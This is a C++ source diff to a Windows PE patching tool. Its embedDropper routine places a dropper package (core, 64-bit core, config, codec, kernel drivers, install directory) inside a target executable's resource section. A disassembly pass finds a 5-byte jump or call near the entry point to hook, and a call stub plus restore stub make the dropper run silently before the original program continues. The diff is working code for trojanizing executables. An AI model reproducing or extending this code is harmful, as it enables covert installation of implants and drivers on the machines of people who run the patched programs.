@@ -941,6 +941,9 @@ IATEntry const & PEObject::getIATEntry( DWORD const rva )
 		throw IATEntryNotFound("No such entry.");
 }
 
+// XXX split disassemble and hooking
+// XXX hooking method: call (length 5)
+// XXX hooking method: call dword ptr (length 6)
 void PEObject::_disassembleCode(unsigned char *start, unsigned char *end, unsigned char* ep, int VA)
 {
 	DISASM _disasm;
@@ -956,129 +959,47 @@ void PEObject::_disassembleCode(unsigned char *start, unsigned char *end, unsign
 	
 	cout << "Disassembling 0x" << hex << startVA << " -> 0x" << hex << endVA << endl;
 	
-	while (1) {
-		int len = Disasm(&_disasm);
-		if ((len != OUT_OF_BLOCK) && (len != UNKNOWN_OPCODE)) {
-			
-			if ( _disasm.Instruction.BranchType != 0 )
-			{
-#if 0
-				std::size_t va = 0;
-				
-				if (_disasm.Instruction.AddrValue)
-					va = _disasm.Instruction.AddrValue;
-				else if (_disasm.Argument2.Memory.Displacement)
-					va = _disasm.Argument2.Memory.Displacement;
+	// reset stage1 hook information
+	memset(&_hookPointer.stage1, 0, sizeof(_hookPointer.stage1));
 	
-				// std::size_t offset = offset((int) va - imageBase());
-				try {
-					IATEntry const & entry = getIATEntry(va);
-					string va_str = IATEntry::str(entry);
-					printf("%.8X(%02d) %s %s\n",(int) _disasm.VirtualAddr, len, &_disasm.Instruction.Mnemonic, va_str.c_str());
-				} catch(IATEntryNotFound) {
-					printf("*** %.8X(%02d) %s\n",(int) _disasm.VirtualAddr, len, &_disasm.CompleteInstr);
-					if (va) {
-#endif
-						printf("*** %.8X(%02d) %s\n",(int) _disasm.VirtualAddr, len, &_disasm.CompleteInstr);
-						printf(" --- HOOKING @ %08x -- \n", _disasm.VirtualAddr);
-						//printf(" --- HOOKING @ %08x -- \n", va);
-						//unsigned char* newEP = atRVA(va - imageBase());
-						//printf(" --- HOOKING @ offset %08x \n", newEP);
-						
-						_hookPointer.stage1.ptr = (char*) _disasm.EIP;
-						_hookPointer.stage1.va = _disasm.VirtualAddr;
-						//_hookPointer.stage1.va = va;
-						
-						return;
-#if 0
-					}
-				}
-				
-				_disasm.EIP = _disasm.EIP + len;
-				_disasm.VirtualAddr = _disasm.VirtualAddr + len;
-#endif
-			}
-			else 
-			{
-				(void) printf("%.8X(%02d) %s\n",(int) _disasm.VirtualAddr, len, &_disasm.CompleteInstr);
-				_disasm.EIP = _disasm.EIP + len;
-				_disasm.VirtualAddr = _disasm.VirtualAddr + len;	
-			}
+	while (1) {
+		// disassemble current instruction
+		int len = Disasm(&_disasm);
+		if (len == OUT_OF_BLOCK || len == UNKNOWN_OPCODE)
+			return;
+		
+		// hook all branches of length 5 (jmp 32bit, call 32bit)
+		if (_disasm.Instruction.BranchType == JmpType && len == STAGE1_STUB_SIZE)
+		{
+			printf("%.8X(%02d) %s\n",(int) _disasm.VirtualAddr, len, &_disasm.CompleteInstr);
+			printf("!!! valid hook found at VA %08x\n", _disasm.VirtualAddr);
 			
-			if (_disasm.EIP >= (long) end)  {
-				return;
-			}
+			_hookPointer.stage1.ptr = (char*) _disasm.EIP;
+			_hookPointer.stage1.va = _disasm.VirtualAddr;
+			
+			return;
 		}
 		
-		else {
+		(void) printf("%.8X(%02d) %s\n",(int) _disasm.VirtualAddr, len, &_disasm.CompleteInstr);
+		
+		// go to next instruction
+		_disasm.EIP = _disasm.EIP + len;
+		_disasm.VirtualAddr = _disasm.VirtualAddr + len;	
+		
+		// if we are over the intended buffer to disassemble, then quit
+		if (_disasm.EIP >= (long) end)  {
 			return;
 		}
 	}
+	
 	return;
 }
-
-#if 0
-void PEObject::_findCavities( GenericSection * const section )
-{
-	cout << "Looking for cavities in section " << section->Name() << endl;
-	char *ptr = section->data();
-	char *end = section->data() + section->VirtualSize();
-	
-	DWORD startPtr = 0;
-	DWORD startVA = 0;
-	DWORD lastVA = 0;
-	
-	while (ptr < end)
-	{
-		if (*ptr == 0) {
-			DWORD VA = section->VirtualAddress() + ( (DWORD)ptr - (DWORD)section->data() ) + imageBase();
-			
-			if (VA - lastVA  == 1) {
-				lastVA = VA;
-			} else {
-				size_t size = lastVA - startVA + 1;
-				if (size > 5) {
-					DWORD IatVA = getSection(IMAGE_DIRECTORY_ENTRY_IMPORT)->VirtualAddress() + imageBase();
-					DWORD IatSize = getSection(IMAGE_DIRECTORY_ENTRY_IMPORT)->VirtualSize();
-					
-					if (startVA + size < IatVA || startVA > IatVA + IatSize) {
-						Cavity cavity;
-						cavity.va = startVA;
-						cavity.size = size;
-						cavity.ptr = (char*) startPtr;
-						_cavities.push_back(cavity);
-					}					
-				}
-				
-				startPtr = (DWORD) ptr;
-				startVA = VA;
-				lastVA = VA;
-			}
-		}
-		ptr++;
-	}
-	
-	size_t size = lastVA - startVA + 1;
-	if (size > 5) {
-		Cavity cavity;
-		cavity.va = startVA;
-		cavity.size = size;
-		cavity.ptr = (char*) startPtr;
-		_cavities.push_back(cavity);
-	}
-	
-	std::sort(_cavities.begin(), _cavities.end(), compareCavity);
-	BOOST_FOREACH( Cavity c, _cavities ) 
-		printCavity(c);
-	
-	cout << endl;
-}
-#endif
 
 bool PEObject::_parseText()
 {
 	unsigned char* ep = atRVA(epRVA());
 	GenericSection* section = findSection(epRVA());
+	// unsigned char * end = atRVAsection->VirtualAddress() + section->SizeOfRawData() - epRVA());
 	
 	// _findCavities( section );
 	_disassembleCode( ep, (unsigned char*) ep + 0x400, ep, epVA() );
@@ -1093,33 +1014,27 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	DWORD OEP = ntHeaders()->OptionalHeader.AddressOfEntryPoint;
 	GenericSection* epSection = findSection(OEP);
 	
-	srand( time(NULL) );
-	DWORD displacement = 0;
-	do
-	{
-		DWORD range = OEP - epSection->VirtualAddress() - 5;
-		DWORD random = rand();
-		displacement = random % range;
-	} while ( epSection->VirtualAddress() + displacement > epSection->VirtualAddress() + epSection->SizeOfRawData() );
+	// do not install stage2 pointer
+	memset(&_hookPointer.stage2, 0, sizeof(_hookPointer.stage2));
 	
-	_hookPointer.stage2.ptr = epSection->data() + displacement;
-	_hookPointer.stage2.va = ntHeaders()->OptionalHeader.ImageBase + epSection->VirtualAddress() + displacement;
+	DropperObject dropper(*this);
 	
+	// check if we have a valid hook pointer
 	if (_hookPointer.stage1.ptr == NULL)
 		throw std::exception("No valid hook location found.");
 	
-	GenericSection* targetSection = getSection(IMAGE_DIRECTORY_ENTRY_RESOURCE);
-	if (!targetSection)
-		throw std::exception("Cannot find resource section.");
-	
-	DropperObject dropper(*this);
+	// save original code for restoring stage1
 	dropper.setPatchCode(0, _hookPointer.stage1.va, _hookPointer.stage1.ptr, 5);
-	dropper.setPatchCode(1, _hookPointer.stage2.va, _hookPointer.stage2.ptr, 5);
-	
+		
 	if ( false == dropper.build(core, core64, config, codec, driver, driver64, installDir) )
 		throw std::exception("Dropper build failed.");
 	
 	// base size is original resource section
+	GenericSection* targetSection = getSection(IMAGE_DIRECTORY_ENTRY_RESOURCE);
+	if (!targetSection)
+		throw std::exception("Cannot find resource section.");
+
+	// align size accounting for dropper size
 	std::size_t sectionSize = alignTo(alignToDWORD(targetSection->SizeOfRawData()) + alignToDWORD(dropper.size()), fileAlignment());
 	if (fixManifest)
 		sectionSize += _sizeOfResources();
@@ -1147,19 +1062,20 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 		+ dropperSkew 
 		+ dropper.epOffset();
 	cout << "*** ENTRY POINT VA 0x" << hex << epVA << endl;
-
+	
 	// fix restore stub
 	DWORD restoreVA =
 		ntHeaders()->OptionalHeader.ImageBase 
 		+ targetSection->VirtualAddress() 
 		+ dropperSkew 
 		+ dropper.restoreStubOffset();
-
+	
 	cout << "*** RESTORE STUB VA 0x" << hex << restoreVA << endl;
 	
 	// copy dropper
 	memcpy(ptr, dropper.data(), dropper.size());
 	
+	// prepare dropper call and restore stub
 	AsmJit::Assembler restoreStub;
 	restoreStub.pushfd();
 	restoreStub.pushad();
@@ -1168,8 +1084,8 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	restoreStub.popfd();
 	restoreStub.sub( AsmJit::dword_ptr(AsmJit::esp, 0), 5 );
 	restoreStub.ret();
-	//restoreStub.jmp( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (_hookPointer.stage1.va - restoreVA) );
-	
+		
+	// install restore and call stub
 	restoreStub.relocCode( ptr + dropper.restoreStubOffset() );
 	
 	ptr += alignToDWORD(dropper.size());
@@ -1209,14 +1125,10 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	targetSection->SetCharacteristics(targetSection->Characteristics() | IMAGE_SCN_MEM_WRITE);
 	
 	// patch stubs code
+	cout << "Stage1 jumping to " << hex << restoreVA << dec << std::endl;
 	AsmJit::Assembler stage1stub;
-	//stage1stub.jmp( ((DWORD)_hookPointer.stage1.ptr) + (_hookPointer.stage2.va - _hookPointer.stage1.va) );
 	stage1stub.call( ((DWORD)_hookPointer.stage1.ptr) + (restoreVA - _hookPointer.stage1.va) );
 	stage1stub.relocCode( (void*) _hookPointer.stage1.ptr );
-	
-	//AsmJit::Assembler stage2stub;
-	//stage2stub.jmp( ((DWORD)_hookPointer.stage2.ptr) + (restoreVA - _hookPointer.stage2.va) );
-	//stage2stub.relocCode( (void*) _hookPointer.stage2.ptr );
 	
 	return true;
 }
